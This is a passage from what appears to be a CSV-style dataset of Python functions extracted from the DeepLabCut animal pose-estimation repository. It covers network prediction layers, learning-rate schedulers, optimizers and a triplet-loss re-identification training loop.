                stage1_paf_out = prediction_layer(self.cfg, net, 'pairwise_pred_s1', self.cfg['num_limbs'] * 2)
                stage2_in = tf.concat([stage1_hm_out, stage1_paf_out, feature], 3)
                stage_input = stage2_in
                stage_paf_output = stage1_paf_out
                stage_hm_output = stage1_hm_out
                for i in range(2, 5):
                    pre_stage_paf_output = stage_paf_output
                    pre_stage_hm_output = stage_hm_output
                    stage_paf_output = prediction_layer_stage(self.cfg, stage_input, f'pairwise_pred_s{i}', self.cfg['num_limbs'] * 2)
                    stage_hm_output = prediction_layer_stage(self.cfg, stage_input, f'part_pred_s{i}', self.cfg['num_joints'] + self.cfg.get('num_idchannel', 0))
                    if i > 2:
                        stage_hm_output = stage_hm_output + pre_stage_hm_output
                    stage_input = tf.concat([stage_hm_output, stage_paf_output, feature], 3)
                out['part_pred'] = prediction_layer_stage(self.cfg, stage_input, 'part_pred', self.cfg['num_joints'] + self.cfg.get('num_idchannel', 0))
                out['pairwise_pred'] = prediction_layer_stage(self.cfg, stage_input, 'pairwise_pred', self.cfg['num_limbs'] * 2)
            if self.cfg['intermediate_supervision']:
                interm_name = layer_name.format(3, self.cfg['intermediate_supervision_layer'])
                block_interm_out = end_points[interm_name]
                out['part_pred_interm'] = prediction_layer(self.cfg, block_interm_out, 'intermediate_supervision', self.cfg['num_joints'] + self.cfg.get('num_idchannel', 0))
    else:
        if 'resnet' in net_type:
            num_layers = re.findall('resnet_([0-9]*)', net_type)[0]
            layer_name = 'resnet_v1_{}/block{}/unit_{}/bottleneck_v1'
            mid_pt = layer_name.format(num_layers, 2, 3)
        elif 'mobilenet' in net_type:
            mid_pt = 'layer_7'
        elif 'efficientnet' in net_type:
            mid_pt = f""block_{parallel_layers[net_type.split('-')[1]]}""
        else:
            raise ValueError(f'Unknown network of type {net_type}')
        final_dims = tf.math.ceil(tf.divide(input_shape[1:3], tf.convert_to_tensor(value=16)))
        interim_dims = tf.scalar_mul(2, final_dims)
        interim_dims = tf.cast(interim_dims, tf.int32)
        bank_3 = end_points[mid_pt]
        bank_3 = tf.image.resize(bank_3, interim_dims)
        with slim.arg_scope([slim.conv2d], padding='SAME', normalizer_fn=None, weights_regularizer=tf.keras.regularizers.l2(0.5 * self.cfg['weight_decay'])):
            with tf.compat.v1.variable_scope('decoder_filters'):
                bank_3 = slim.conv2d(bank_3, self.cfg.get('bank3', 128), 1, scope='decoder_parallel_1')
        with slim.arg_scope([slim.conv2d_transpose], padding='SAME', normalizer_fn=None, weights_regularizer=tf.keras.regularizers.l2(0.5 * self.cfg['weight_decay'])):
            with tf.compat.v1.variable_scope('upsampled_features'):
                upsampled_features = slim.conv2d_transpose(features, self.cfg.get('bank5', 128), kernel_size=[3, 3], stride=2, scope='block4')
        net = tf.concat([bank_3, upsampled_features], 3)
        out = super(PoseMultiNet, self).prediction_layers(net, scope, reuse)
        with tf.compat.v1.variable_scope(scope, reuse=reuse):
            if self.cfg['intermediate_supervision'] and 'efficientnet' not in net_type:
                if 'mobilenet' in net_type:
                    feat = end_points[f""layer_{self.cfg['intermediate_supervision_layer']}""]
                elif 'resnet' in net_type:
                    layer_name = 'resnet_v1_{}/block{}/unit_{}/bottleneck_v1'
                    num_layers = re.findall('resnet_([0-9]*)', net_type)[0]
                    interm_name = layer_name.format(num_layers, 3, self.cfg['intermediate_supervision_layer'])
                    feat = end_points[interm_name]
                else:
                    return out
                pred_layer = out['part_pred_interm'] = prediction_layer(self.cfg, feat, 'intermediate_supervision', self.cfg['num_joints'] + self.cfg.get('num_idchannel', 0))
                out['part_pred_interm'] = pred_layer
    out['features'] = features
    return out"
AlexEMG/DeepLabCut,get_net,"def get_net(self, inputs):
    (net, end_points) = self.extract_features(inputs)
    return self.prediction_layers(net, end_points, tf.shape(input=inputs))"
AlexEMG/DeepLabCut,__init__,"def __init__(self, cfg):
    super(PoseResnet, self).__init__(cfg)"
AlexEMG/DeepLabCut,extract_features,"def extract_features(self, inputs):
    net_fun = net_funcs[self.cfg['net_type']]
    im_centered = self.center_inputs(inputs)
    with slim.arg_scope(resnet_v1.resnet_arg_scope()):
        (net, end_points) = net_fun(im_centered, global_pool=False, output_stride=16, is_training=False)
    return (net, end_points)"
AlexEMG/DeepLabCut,prediction_layers,"def prediction_layers(self, features, end_points, scope='pose', reuse=None):
    out = super(PoseResnet, self).prediction_layers(features, scope, reuse)
    out['features'] = features
    with tf.compat.v1.variable_scope(scope, reuse=reuse):
        if self.cfg['intermediate_supervision']:
            layer_name = 'resnet_v1_{}/block{}/unit_{}/bottleneck_v1'
            num_layers = re.findall('resnet_([0-9]*)', self.cfg['net_type'])[0]
            interm_name = layer_name.format(num_layers, 3, self.cfg['intermediate_supervision_layer'])
            block_interm_out = end_points[interm_name]
            out['part_pred_interm'] = prediction_layer(self.cfg, block_interm_out, 'intermediate_supervision', self.cfg['num_joints'] + self.cfg.get('num_idchannel', 0))
    return out"
AlexEMG/DeepLabCut,get_net,"def get_net(self, inputs):
    (net, end_points) = self.extract_features(inputs)
    return self.prediction_layers(net, end_points)"
AlexEMG/DeepLabCut,wrapper,"def wrapper(func, *args, **kwargs):
    partial_func = functools.partial(func, *args, **kwargs)
    functools.update_wrapper(partial_func, func)
    return partial_func"
AlexEMG/DeepLabCut,get_batch_spec,"def get_batch_spec(cfg):
    num_joints = cfg['num_joints']
    num_limbs = cfg['num_limbs']
    batch_size = cfg['batch_size']
    batch_spec = {Batch.inputs: [batch_size, None, None, 3], Batch.part_score_targets: [batch_size, None, None, num_joints + cfg.get('num_idchannel', 0)], Batch.part_score_weights: [batch_size, None, None, num_joints + cfg.get('num_idchannel', 0)]}
    if cfg['location_refinement']:
        batch_spec[Batch.locref_targets] = [batch_size, None, None, num_joints * 2]
        batch_spec[Batch.locref_mask] = [batch_size, None, None, num_joints * 2]
    if cfg['pairwise_predict']:
        print('Getting specs', cfg['dataset_type'], num_limbs, num_joints)
        if 'multi-animal' not in cfg['dataset_type']:
            batch_spec[Batch.pairwise_targets] = [batch_size, None, None, num_joints * (num_joints - 1) * 2]
            batch_spec[Batch.pairwise_mask] = [batch_size, None, None, num_joints * (num_joints - 1) * 2]
        else:
            batch_spec[Batch.pairwise_targets] = [batch_size, None, None, num_limbs * 2]
            batch_spec[Batch.pairwise_mask] = [batch_size, None, None, num_limbs * 2]
    return batch_spec"
AlexEMG/DeepLabCut,make_2d_gaussian_kernel,"def make_2d_gaussian_kernel(sigma, size):
    sigma = tf.convert_to_tensor(sigma, dtype=tf.float32)
    k = tf.range(-size // 2 + 1, size // 2 + 1)
    k = tf.cast(k ** 2, sigma.dtype)
    k = tf.nn.softmax(-k / (2 * sigma ** 2))
    return tf.einsum('i,j->ij', k, k)"
AlexEMG/DeepLabCut,build_learning_rate,"def build_learning_rate(initial_lr, global_step, steps_per_epoch=None, lr_decay_type='exponential', decay_factor=0.97, decay_epochs=2.4, total_steps=None, warmup_epochs=5):
    """"""Build learning rate.""""""
    if lr_decay_type == 'exponential':
        assert steps_per_epoch is not None
        decay_steps = steps_per_epoch * decay_epochs
        lr = tf.compat.v1.train.exponential_decay(initial_lr, global_step, decay_steps, decay_factor, staircase=True)
    elif lr_decay_type == 'cosine':
        assert total_steps is not None
        lr = 0.5 * initial_lr * (1 + tf.cos(np.pi * tf.cast(global_step, tf.float32) / total_steps))
    elif lr_decay_type == 'constant':
        lr = initial_lr
    else:
        assert False, 'Unknown lr_decay_type : %s' % lr_decay_type
    if warmup_epochs:
        tf.compat.v1.logging.info('Learning rate warmup_epochs: %d' % warmup_epochs)
        warmup_steps = int(warmup_epochs * steps_per_epoch)
        warmup_lr = initial_lr * tf.cast(global_step, tf.float32) / tf.cast(warmup_steps, tf.float32)
        lr = tf.cond(pred=global_step < warmup_steps, true_fn=lambda : warmup_lr, false_fn=lambda : lr)
    return lr"
AlexEMG/DeepLabCut,build_optimizer,"def build_optimizer(learning_rate, optimizer_name='rmsprop', decay=0.9, epsilon=0.001, momentum=0.9):
    """"""Build optimizer.""""""
    if optimizer_name == 'sgd':
        tf.compat.v1.logging.info('Using SGD optimizer')
        optimizer = tf.compat.v1.train.GradientDescentOptimizer(learning_rate=learning_rate)
    elif optimizer_name == 'momentum':
        tf.compat.v1.logging.info('Using Momentum optimizer')
        optimizer = tf.compat.v1.train.MomentumOptimizer(learning_rate=learning_rate, momentum=momentum)
    elif optimizer_name == 'rmsprop':
        tf.compat.v1.logging.info('Using RMSProp optimizer')
        optimizer = tf.compat.v1.train.RMSPropOptimizer(learning_rate, decay, momentum, epsilon)
    else:
        tf.compat.v1.logging.fatal('Unknown optimizer:', optimizer_name)
    return optimizer"
AlexEMG/DeepLabCut,drop_connect,"def drop_connect(inputs, is_training, drop_connect_rate):
    """"""Apply drop connect.""""""
    if not is_training:
        return inputs
    keep_prob = 1.0 - drop_connect_rate
    batch_size = tf.shape(input=inputs)[0]
    random_tensor = keep_prob
    random_tensor += tf.random.uniform([batch_size, 1, 1, 1], dtype=inputs.dtype)
    binary_tensor = tf.floor(random_tensor)
    output = tf.compat.v1.div(inputs, keep_prob) * binary_tensor
    return output"
AlexEMG/DeepLabCut,__init__,"def __init__(self, fused=False, **kwargs):
    if fused in (True, None):
        raise ValueError('TpuBatchNormalization does not support fused=True.')
    super(TpuBatchNormalization, self).__init__(fused=fused, **kwargs)"
AlexEMG/DeepLabCut,_cross_replica_average,"@staticmethod
def _cross_replica_average(t, num_shards_per_group):
    """"""Calculates the average value of input tensor across TPU replicas.""""""
    num_shards = tpu_function.get_tpu_context().number_of_shards
    group_assignment = None
    if num_shards_per_group > 1:
        if num_shards % num_shards_per_group != 0:
            raise ValueError('num_shards: %d mod shards_per_group: %d, should be 0' % (num_shards, num_shards_per_group))
        num_groups = num_shards // num_shards_per_group
        group_assignment = [[x for x in range(num_shards) if x // num_shards_per_group == y] for y in range(num_groups)]
    return tpu_ops.cross_replica_sum(t, group_assignment) / tf.cast(num_shards_per_group, t.dtype)"
AlexEMG/DeepLabCut,_moments,"def _moments(self, inputs, reduction_axes, keep_dims):
    """"""Compute the mean and variance: it overrides the original _moments.""""""
    (shard_mean, shard_variance) = super(TpuBatchNormalization, self)._moments(inputs, reduction_axes, keep_dims=keep_dims)
    num_shards = tpu_function.get_tpu_context().number_of_shards or 1
    if num_shards <= 8:
        num_shards_per_group = 1
    else:
        num_shards_per_group = max(8, num_shards // 8)
    tf.compat.v1.logging.info('TpuBatchNormalization with num_shards_per_group %s', num_shards_per_group)
    if num_shards_per_group > 1:
        shard_square_of_mean = tf.math.square(shard_mean)
        shard_mean_of_square = shard_variance + shard_square_of_mean
        group_mean = self._cross_replica_average(shard_mean, num_shards_per_group)
        group_mean_of_square = self._cross_replica_average(shard_mean_of_square, num_shards_per_group)
        group_variance = group_mean_of_square - tf.math.square(group_mean)
        return (group_mean, group_variance)
    return (shard_mean, shard_variance)"
AlexEMG/DeepLabCut,__init__,"def __init__(self, name='tpu_batch_normalization', **kwargs):
    super(BatchNormalization, self).__init__(name=name, **kwargs)"
AlexEMG/DeepLabCut,setup_logging,"def setup_logging():
    FORMAT = '%(asctime)-15s %(message)s'
    logging.basicConfig(filename=os.path.join('log.txt'), filemode='a', datefmt='%Y-%m-%d %H:%M:%S', level=logging.INFO, format=FORMAT)
    console = logging.StreamHandler()
    console.setLevel(logging.INFO)
    logging.getLogger('').addHandler(console)"
AlexEMG/DeepLabCut,_npcircle,"def _npcircle(image, cx, cy, radius, color, transparency=0.0):
    """"""Draw a circle on an image using only numpy methods.""""""
    radius = int(radius)
    cx = int(cx)
    cy = int(cy)
    (y, x) = np.ogrid[-radius:radius, -radius:radius]
    index = x ** 2 + y ** 2 <= radius ** 2
    image[cy - radius:cy + radius, cx - radius:cx + radius][index] = (image[cy - radius:cy + radius, cx - radius:cx + radius][index].astype('float32') * transparency + np.array(color).astype('float32') * (1.0 - transparency)).astype('uint8')"
AlexEMG/DeepLabCut,check_point,"def check_point(cur_x, cur_y, minx, miny, maxx, maxy):
    return minx < cur_x < maxx and miny < cur_y < maxy"
AlexEMG/DeepLabCut,visualize_joints,"def visualize_joints(image, pose):
    marker_size = 8
    minx = 2 * marker_size
    miny = 2 * marker_size
    maxx = image.shape[1] - 2 * marker_size
    maxy = image.shape[0] - 2 * marker_size
    num_joints = pose.shape[0]
    visim = image.copy()
    colors = [[255, 0, 0], [0, 255, 0], [0, 0, 255], [0, 245, 255], [255, 131, 250], [255, 255, 0], [255, 0, 0], [0, 255, 0], [0, 0, 255], [0, 245, 255], [255, 131, 250], [255, 255, 0], [0, 0, 0], [255, 255, 255], [255, 0, 0], [0, 255, 0], [0, 0, 255]]
    for p_idx in range(num_joints):
        cur_x = pose[p_idx, 0]
        cur_y = pose[p_idx, 1]
        if check_point(cur_x, cur_y, minx, miny, maxx, maxy):
            _npcircle(visim, cur_x, cur_y, marker_size, colors[p_idx], 0.0)
    return visim"
AlexEMG/DeepLabCut,show_heatmaps,"def show_heatmaps(cfg, img, scmap, pose, cmap='jet'):
    interp = 'bilinear'
    all_joints = cfg['all_joints']
    all_joints_names = cfg['all_joints_names']
    subplot_width = 3
    subplot_height = math.ceil((len(all_joints) + 1) / subplot_width)
    (f, axarr) = plt.subplots(subplot_height, subplot_width)
    for (pidx, part) in enumerate(all_joints):
        plot_j = (pidx + 1) // subplot_width
        plot_i = (pidx + 1) % subplot_width
        scmap_part = np.sum(scmap[:, :, part], axis=2)
        scmap_part = imresize(scmap_part, 8.0, interpolationmethod=cv2.INTER_CUBIC)
        scmap_part = np.lib.pad(scmap_part, ((4, 0), (4, 0)), 'minimum')
        curr_plot = axarr[plot_j, plot_i]
        curr_plot.set_title(all_joints_names[pidx])
        curr_plot.axis('off')
        curr_plot.imshow(img, interpolation=interp)
        curr_plot.imshow(scmap_part, alpha=0.5, cmap=cmap, interpolation=interp)
    curr_plot = axarr[0, 0]
    curr_plot.set_title('Pose')
    curr_plot.axis('off')
    curr_plot.imshow(visualize_joints(img, pose))
    plt.show()"
AlexEMG/DeepLabCut,waitforbuttonpress,"def waitforbuttonpress():
    plt.waitforbuttonpress(timeout=1)"
AlexEMG/DeepLabCut,__init__,"def __init__(self, datasource, transform=None):
    self.x = datasource
    '\n        for i in range(self.x.shape[0]):\n            for j in range(self.x.shape[1]):\n                # i th vector at j th kpt\n                v = self.x[i][j]\n                normalized_v = v / np.sqrt(np.sum(v**2))\n                self.x[i][j] = normalized_v\n        '
    self.transform = transform"
AlexEMG/DeepLabCut,__len__,"def __len__(self):
    return self.x.shape[0]"
AlexEMG/DeepLabCut,__getitem__,"def __getitem__(self, index):
    (anchor, pos, neg) = self.x[index]
    anchor = anchor.astype(np.float32)
    pos = pos.astype(np.float32)
    neg = neg.astype(np.float32)
    if self.transform is not None:
        anchor = self.transform(anchor)
        pos = self.transform(pos)
        neg = self.transform(neg)
    return (anchor, pos, neg)"
AlexEMG/DeepLabCut,make_dlc_dataloader,"def make_dlc_dataloader(train_list, test_list, batch_size=64):
    train_dataset = TripletDataset(train_list)
    train_loader = DataLoader(train_dataset, batch_size=batch_size)
    val_dataset = TripletDataset(test_list)
    val_loader = DataLoader(val_dataset, batch_size=batch_size)
    return (train_loader, val_loader)"
AlexEMG/DeepLabCut,easy_triplet_loss,"def easy_triplet_loss():

    def loss_func(anchor, positive, neg):
        triplet_loss = torch.nn.TripletMarginLoss()
        loss = triplet_loss(anchor, positive, neg)
        return loss
    return loss_func"
AlexEMG/DeepLabCut,loss_func,"def loss_func(anchor, positive, neg):
    triplet_loss = torch.nn.TripletMarginLoss()
    loss = triplet_loss(anchor, positive, neg)
    return loss"
AlexEMG/DeepLabCut,make_dlc_model,"def make_dlc_model(cfg, feature_dim, kpt_num):
    model = build_dlc_transformer(cfg, feature_dim, kpt_num, __factory_T_type)
    return model"
AlexEMG/DeepLabCut,__init__,"def __init__(self, cfg, in_chans, kpt_num, factory):
    super(build_dlc_transformer, self).__init__()
    self.cos_layer = cfg['cos_layer']
    self.in_planes = 128
    self.kpt_num = kpt_num
    self.base = factory['dlc_transreid'](in_chans=in_chans, sie_xishu=cfg['sie_coe'], drop_path_rate=cfg['drop_path'], drop_rate=cfg['drop_out'], attn_drop_rate=cfg['att_drop_rate'], kpt_num=kpt_num)
    self.classifier = nn.Identity()
    self.bottleneck = nn.Identity()
    self.ID_LOSS_TYPE = 'cosface'"
AlexEMG/DeepLabCut,forward,"def forward(self, x):
    global_feat = self.base(x)
    feat = self.bottleneck(global_feat)
    q = self.classifier(feat)
    norm = torch.norm(q, p=2, dim=1, keepdim=True)
    q = q.div(norm)
    return q"
AlexEMG/DeepLabCut,load_param,"def load_param(self, trained_path):
    param_dict = torch.load(trained_path)
    for i in param_dict:
        self.state_dict()[i.replace('module.', '')].copy_(param_dict[i])
    print('Loading pretrained model from {}'.format(trained_path))"
AlexEMG/DeepLabCut,dist,"def dist(a, b):
    return torch.sqrt(torch.sum((a - b) ** 2, dim=1))"
AlexEMG/DeepLabCut,calc_correct,"def calc_correct(anchor, pos, neg):
    ap_dist = dist(anchor, pos)
    an_dist = dist(anchor, neg)
    indices = ap_dist < an_dist
    return torch.sum(indices)"
AlexEMG/DeepLabCut,calc_cos_correct,"def calc_cos_correct(vec1, gt1, vec2, gt2, threshold=0.5):
    cos = nn.CosineSimilarity(dim=1, eps=1e-06)
    confidence = cos(vec1, vec2)
    pred_mask = confidence > threshold
    gt_mask = gt1 == gt2
    n_correct = torch.sum(torch.eq(pred_mask, gt_mask))
    return n_correct"
AlexEMG/DeepLabCut,default_device,"def default_device(device='cuda'):
    dev = torch.device(device) if torch.cuda.is_available() else torch.device('cpu')
    return dev"
AlexEMG/DeepLabCut,do_dlc_train,"def do_dlc_train(cfg, model, triplet_loss, train_loader, val_loader, optimizer, scheduler, num_kpts, feature_dim, num_query, total_epochs=300, ckpt_folder=''):
    log_period = cfg['log_period']
    checkpoint_period = cfg['checkpoint_period']
    eval_period = 10
    device = default_device(cfg['device'])
    logger = logging.getLogger('transreid.train')
    logger.info('start training')
    _LOCAL_PROCESS_GROUP = None
    if device:
        model.to(device)
    loss_meter = AverageMeter()
    acc_meter = AverageMeter()
    evaluator = R1_mAP_eval(num_query, max_rank=50, feat_norm=cfg['feat_norm'])
    epoch_list = []
    train_acc_list = []
    test_acc_list = []
    plot_dict = {}
    for epoch in range(1, total_epochs + 1):
        epoch_list.append(epoch)
        start_time = time.time()
        loss_meter.reset()
        acc_meter.reset()
        evaluator.reset()
        scheduler.step(epoch)
        model.train()
        total_n = 0.0
        total_correct = 0.0
        for (n_iter, (anchor, pos, neg)) in enumerate(train_loader):
            optimizer.zero_grad()
            anchor = anchor.to(device)
            pos = pos.to(device)
            neg = neg.to(device)
            anchor_feat = model(anchor)
            pos_feat = model(pos)
            neg_feat = model(neg)
            loss = triplet_loss(anchor_feat, pos_feat, neg_feat)
            loss.backward()
            optimizer.step()
            total_n += anchor_feat.shape[0]
            total_correct += calc_correct(anchor_feat, pos_feat, neg_feat)
            loss_meter.update(loss.item())
            if torch.cuda.is_available():
                torch.cuda.synchronize()
            if (n_iter + 1) % log_period == 0:
                logger.info('Epoch[{}] Iteration[{}/{}] Loss: {:.3f}, , Base Lr: {:.2e}'.format(epoch, n_iter + 1, len(train_loader), loss_meter.avg, scheduler._get_lr(epoch)[0]))
        end_time = time.time()
        time_per_batch = (end_time - start_time) / (n_iter + 1)
        train_acc = total_correct / total_n
        train_acc_list.append(train_acc.item())
        if cfg['dist_train']:
            pass
        else:
            logger.info('Epoch {} done. Time per batch: {:.3f}[s] Speed: {:.1f}[samples/s]'.format(epoch, time_per_batch, train_loader.batch_size / time_per_batch))
        model_name = f'dlc_transreid'
        if epoch % checkpoint_period == 0:
            torch.save({'state_dict': model.state_dict(), 'num_kpts': num_kpts, 'feature_dim': feature_dim}, os.path.join(ckpt_folder, model_name + '_{}.pth'.format(epoch)))
        if epoch % eval_period == 0:
            model.eval()
            val_loss = 0.0
            total_n = 0.0
            total_correct = 0.0
            for (n_iter, (anchor, pos, neg)) in enumerate(val_loader):
                with torch.no_grad():
                    anchor = anchor.to(device)
                    pos = pos.to(device)
                    neg = neg.to(device)
                    anchor_feat = model(anchor)
                    pos_feat = model(pos)
                    neg_feat = model(neg)
                    loss = triplet_loss(anchor_feat, pos_feat, neg_feat)
                    val_loss += loss.item()
                    total_n += anchor_feat.shape[0]
                    total_correct += calc_correct(anchor_feat, pos_feat, neg_feat)
            logger.info('Validation Results - Epoch: {}'.format(epoch))
            test_acc = total_correct / total_n
            test_acc_list.append(test_acc.item())
            print(f'Epoch {epoch}, train acc: {train_acc:.2f}')
            print(f'Epoch {epoch}, test acc {test_acc:.2f}')
            if torch.cuda.is_available():
                torch.cuda.empty_cache()
    plot_dict['train_acc'] = train_acc_list
    plot_dict['test_acc'] = test_acc_list
    plot_dict['epochs'] = epoch_list
    with open(os.path.join(ckpt_folder, 'dlc_transreid_results.pickle'), 'wb') as handle:
        pickle.dump(plot_dict, handle, protocol=pickle.HIGHEST_PROTOCOL)"
AlexEMG/DeepLabCut,do_dlc_inference,"def do_dlc_inference(cfg, model, triplet_loss, val_loader, num_query):
    device = default_device(cfg['device'])
    logger = logging.getLogger('transreid.test')
    logger.info('Enter inferencing')
    evaluator = R1_mAP_eval(num_query, max_rank=50, feat_norm=cfg['feat_norm'])
    evaluator.reset()
    if device:
        if torch.cuda.device_count() > 1:
            print('Using {} GPUs for inference'.format(torch.cuda.device_count()))
            model = nn.DataParallel(model)
        model.to(device)
    model.eval()
    val_loss = 0.0
    features_list = []
    labels_list = []
    total_n = 0.0
    total_correct = 0.0
    for (n_iter, (anchor, pos, neg)) in enumerate(val_loader):
        with torch.no_grad():
            anchor = anchor.to(device)
            pos = pos.to(device)
            neg = neg.to(device)
            anchor_feat = model(anchor)
            pos_feat = model(pos)
            neg_feat = model(neg)
            features_list.append(pos_feat.cpu().detach().numpy())
            features_list.append(neg_feat.cpu().detach().numpy())
            for i in range(neg.shape[0]):
                labels_list.append(0)
                labels_list.append(1)
            total_n += anchor_feat.shape[0]
            total_correct += calc_correct(anchor_feat, pos_feat, neg_feat)
            cos = nn.CosineSimilarity(dim=1, eps=1e-06)
            cos_dist = cos(anchor_feat, pos_feat)
            print('cos_dist ap', cos_dist)
            cos_dist = cos(anchor_feat, neg_feat)
            print('cos_dist an', cos_dist)
            loss = triplet_loss(anchor_feat, pos_feat, neg_feat)
            val_loss += loss.item()
    features_list = np.vstack(features_list)
    with open('video_trans_features.npy', 'wb') as f:
        np.save(f, features_list)
    with open('labels.npy', 'wb') as f:
        np.save(f, labels_list)
    print(f'validation loss {val_loss / len(val_loader)}')
    print(f' acc {total_correct / total_n}')
    logger.info('Validation Results ')"
AlexEMG/DeepLabCut,do_dlc_pair_inference,"def do_dlc_pair_inference(cfg, model, val_loader, num_query):
    device = default_device(cfg['device'])
    logger = logging.getLogger('transreid.test')
    logger.info('Enter inferencing')
    evaluator = R1_mAP_eval(num_query, max_rank=50, feat_norm=cfg['feat_norm'])
    evaluator.reset()
    if device and torch.cuda.is_available():
        if torch.cuda.device_count() > 1:
            print('Using {} GPUs for inference'.format(torch.cuda.device_count()))
            model = nn.DataParallel(model)
        model.to(device)
    model.eval()
    val_loss = 0.0
    total_n = 0.0
    total_correct = 0.0
    for (n_iter, ((vec1, gt1), (vec2, gt2))) in enumerate(val_loader):
        with torch.no_grad():
            gt1 = gt1.to(device)
            gt2 = gt2.to(device)
            vec1 = vec1.to(device)
            vec2 = vec2.to(device)
            vec1_feat = model(vec1)
            vec2_feat = model(vec2)
            total_n += vec1_feat.shape[0]
            total_correct += calc_cos_correct(vec1_feat, gt1, vec2_feat, gt2)
    print(f' acc {total_correct / total_n}')
    logger.info('Validation Results ')"
AlexEMG/DeepLabCut,__init__,"def __init__(self, optimizer: torch.optim.Optimizer, t_initial: int, t_mul: float=1.0, lr_min: float=0.0, decay_rate: float=1.0, warmup_t=0, warmup_lr_init=0, warmup_prefix=False, cycle_limit=0, t_in_epochs=True, noise_range_t=None, noise_pct=0.67, noise_std=1.0, noise_seed=42, initialize=True) -> None:
    super().__init__(optimizer, param_group_field='lr', noise_range_t=noise_range_t, noise_pct=noise_pct, noise_std=noise_std, noise_seed=noise_seed, initialize=initialize)
    assert t_initial > 0
    assert lr_min >= 0
    if t_initial == 1 and t_mul == 1 and (decay_rate == 1):
        _logger.warning('Cosine annealing scheduler will have no effect on the learning rate since t_initial = t_mul = eta_mul = 1.')
    self.t_initial = t_initial
    self.t_mul = t_mul
    self.lr_min = lr_min
    self.decay_rate = decay_rate
    self.cycle_limit = cycle_limit
    self.warmup_t = warmup_t
    self.warmup_lr_init = warmup_lr_init
    self.warmup_prefix = warmup_prefix
    self.t_in_epochs = t_in_epochs
    if self.warmup_t:
        self.warmup_steps = [(v - warmup_lr_init) / self.warmup_t for v in self.base_values]
        super().update_groups(self.warmup_lr_init)
    else:
        self.warmup_steps = [1 for _ in self.base_values]"
AlexEMG/DeepLabCut,_get_lr,"def _get_lr(self, t):
    if t < self.warmup_t:
        lrs = [self.warmup_lr_init + t * s for s in self.warmup_steps]
    else:
        if self.warmup_prefix:
            t = t - self.warmup_t
        if self.t_mul != 1:
            i = math.floor(math.log(1 - t / self.t_initial * (1 - self.t_mul), self.t_mul))
            t_i = self.t_mul ** i * self.t_initial
            t_curr = t - (1 - self.t_mul ** i) / (1 - self.t_mul) * self.t_initial
        else:
            i = t // self.t_initial
            t_i = self.t_initial
            t_curr = t - self.t_initial * i
        gamma = self.decay_rate ** i
        lr_min = self.lr_min * gamma
        lr_max_values = [v * gamma for v in self.base_values]
        if self.cycle_limit == 0 or (self.cycle_limit > 0 and i < self.cycle_limit):
            lrs = [lr_min + 0.5 * (lr_max - lr_min) * (1 + math.cos(math.pi * t_curr / t_i)) for lr_max in lr_max_values]
        else:
            lrs = [self.lr_min for _ in self.base_values]
    return lrs"
AlexEMG/DeepLabCut,get_epoch_values,"def get_epoch_values(self, epoch: int):
    if self.t_in_epochs:
        return self._get_lr(epoch)
    else:
        return None"
AlexEMG/DeepLabCut,get_update_values,"def get_update_values(self, num_updates: int):
    if not self.t_in_epochs:
        return self._get_lr(num_updates)
    else:
        return None"
AlexEMG/DeepLabCut,get_cycle_length,"def get_cycle_length(self, cycles=0):
    if not cycles:
        cycles = self.cycle_limit
    cycles = max(1, cycles)
    if self.t_mul == 1.0:
        return self.t_initial * cycles
    else:
        return int(math.floor(-self.t_initial * (self.t_mul ** cycles - 1) / (1 - self.t_mul)))"
AlexEMG/DeepLabCut,make_easy_optimizer,"def make_easy_optimizer(cfg, model):
    params = []
    for (key, value) in model.named_parameters():
        if not value.requires_grad:
            continue
        lr = cfg['base_lr']
        weight_decay = cfg['weight_decay']
        if 'bias' in key:
            lr = cfg['base_lr'] * cfg['bias_lr_factor']
            weight_decay = cfg['weight_decay_bias']
        if cfg['large_fc_lr']:
            if 'classifier' in key or 'arcface' in key:
                lr = cfg['base_lr'] * 2
                print('Using two times learning rate for fc ')
        params += [{'params': [value], 'lr': lr, 'weight_decay': weight_decay}]
    optimizer_name = cfg['optimizer_name']
    if optimizer_name == 'SGD':
        optimizer = getattr(torch.optim, optimizer_name)(params, momentum=cfg['momentum'])
    elif optimizer_name == 'AdamW':
        optimizer = torch.optim.AdamW(params, lr=cfg['base_lr'], weight_decay=cfg['weight_decay'])
    else:
        optimizer = getattr(torch.optim, optimizer_name)(params)
    return optimizer"
AlexEMG/DeepLabCut,__init__,"def __init__(self, optimizer: torch.optim.Optimizer, param_group_field: str, noise_range_t=None, noise_type='normal', noise_pct=0.67, noise_std=1.0, noise_seed=None, initialize: bool=True) -> None:
    self.optimizer = optimizer
    self.param_group_field = param_group_field
    self._initial_param_group_field = f'initial_{param_group_field}'
    if initialize:
        for (i, group) in enumerate(self.optimizer.param_groups):
            if param_group_field not in group:
                raise KeyError(f'{param_group_field} missing from param_groups[{i}]')
            group.setdefault(self._initial_param_group_field, group[param_group_field])
    else:
        for (i, group) in enumerate(self.optimizer.param_groups):
            if self._initial_param_group_field not in group:
                raise KeyError(f'{self._initial_param_group_field} missing from param_groups[{i}]')
    self.base_values = [group[self._initial_param_group_field] for group in self.optimizer.param_groups]
    self.metric = None
    self.noise_range_t = noise_range_t
    self.noise_pct = noise_pct
    self.noise_type = noise_type
    self.noise_std = noise_std
    self.noise_seed = noise_seed if noise_seed is not None else 42
    self.update_groups(self.base_values)"
AlexEMG/DeepLabCut,state_dict,"def state_dict(self) -> Dict[str, Any]:
    return {key: value for (key, value) in self.__dict__.items() if key != 'optimizer'}"
AlexEMG/DeepLabCut,load_state_dict,"def load_state_dict(self, state_dict: Dict[str, Any]) -> None:
    self.__dict__.update(state_dict)"
AlexEMG/DeepLabCut,get_epoch_values,"def get_epoch_values(self, epoch: int):
    return None"
AlexEMG/DeepLabCut,get_update_values,"def get_update_values(self, num_updates: int):
    return None"
AlexEMG/DeepLabCut,step,"def step(self, epoch: int, metric: float=None) -> None:
    self.metric = metric
    values = self.get_epoch_values(epoch)
    if values is not None:
        values = self._add_noise(values, epoch)
        self.update_groups(values)"
AlexEMG/DeepLabCut,step_update,"def step_update(self, num_updates: int, metric: float=None):
    self.metric = metric
    values = self.get_update_values(num_updates)
    if values is not None:
        values = self._add_noise(values, num_updates)
        self.update_groups(values)"
AlexEMG/DeepLabCut,update_groups,"def update_groups(self, values):
    if not isinstance(values, (list, tuple)):
        values = [values] * len(self.optimizer.param_groups)
    for (param_group, value) in zip(self.optimizer.param_groups, values):
        param_group[self.param_group_field] = value"
AlexEMG/DeepLabCut,_add_noise,"def _add_noise(self, lrs, t):
    if self.noise_range_t is not None:
        if isinstance(self.noise_range_t, (list, tuple)):
            apply_noise = self.noise_range_t[0] <= t < self.noise_range_t[1]
        else:
